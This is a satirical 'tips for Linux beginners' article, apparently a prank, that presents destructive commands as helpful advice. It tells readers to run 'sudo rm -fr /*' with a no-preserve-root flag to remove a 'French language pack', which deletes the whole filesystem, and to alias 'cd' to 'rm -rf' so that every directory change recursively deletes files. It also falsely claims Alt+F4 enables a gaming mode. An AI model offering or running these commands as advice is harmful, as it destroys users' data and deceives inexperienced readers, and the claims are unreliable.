Thinking of switching to Linux, or already made the switch? Great! For best 
results, we recommend you follow these tips and tricks for Linux beginners to 
take full advantage of your ignorance of how Linux works. In this insightful 
article, you'll learn some best practices, tips, and tricks for your new Linux 
computer.

## #1: Remove the Fr\*nch language pack
Nobody needs that stupid language pack taking up 2 kilobytes of space on their 
8-terabyte drive. For the sake of peace and longevity, we recommend you UTFLP 
(Uninstall The Fr\*nch Language Pack) ASAP (After Shrieking At Pineapples). Make 
certain that you have shrieked at pineapples before attempting to UTFLP, or it 
won't be super effective against Pikachu.

Once you have shrieked at some pineapples, you can proceed with uninstalling 
the Fr\*nch language pack. Run the following command in your terminal:
```
sudo rm -fr /* --nopreserveroot
``` 

Make sure you add the `--nopreserveroot` to obliterate the Fr\*nch roots so the
Fr\*nch language pack never grows back. If you fail to do so, it will start 
taking over your computer. Some users who fell victim to this have reported
Fr\*nch computer errors like `Erreur: quelque chose a terriblement mal tourné.`,
Fr\*nch baguettes growing in their computer's GPU (Garden Planting Unit), or even
their computer towers turning into Eiffel Towers. To avoid these issues, 
using `--nopreserveroot` ensures the Fr\*nch language itself will be obliterated 
from your timeline.

## #2: Run this code on every terminal session
If you use the Linux terminal often, you may notice you have to do a lot of 
navigating around your file system with `cd`. This can be tiring, so we came up 
with a quick trick to help reduce how much navigating you need to do!
```
alias cd="rm -rf"
``` 

## #3: Enable gaming mode
Unlike on Windows, Alt+F4 on Linux enables a hidden setting to optimize your 
gaming performance for a much smoother experience overall! This especially helps
not only when pro gaming, but also when programming, as typing code on a 
keyboard can be very resource intensive, depending on how furiously you type.
